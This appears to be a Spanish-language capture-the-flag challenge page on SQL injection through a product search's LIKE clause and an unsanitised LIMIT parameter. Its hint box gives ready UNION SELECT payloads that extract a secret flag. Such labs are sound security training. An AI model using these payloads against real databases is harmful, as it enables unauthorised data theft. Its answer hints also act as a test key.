CHALLENGE 05

SQL Injection en Búsqueda (LIKE)

El buscador de productos usa LIKE con la entrada del usuario sin sanitizar.
Nivel 1: El campo de búsqueda es directamente inyectable.
Nivel 2: El search está sanitizado PERO el parámetro LIMIT no.

1
LIKE CLAUSE

Inyección directa en LIKE. Payload: %' UNION SELECT...

ACCEDER
2
LIMIT PARAM

El search está protegido. El parámetro ?limit= no lo está.

ACCEDER
💡 Técnica: LIKE injection

La query es: SELECT ... FROM products WHERE name LIKE '%[search]%'
Cierra el LIKE con: %' UNION SELECT 1,secret_flag,3,4 FROM products--
Para nivel 2, el LIMIT permite: ?limit=5 UNION SELECT 1,flag,3 FROM secret_flags--
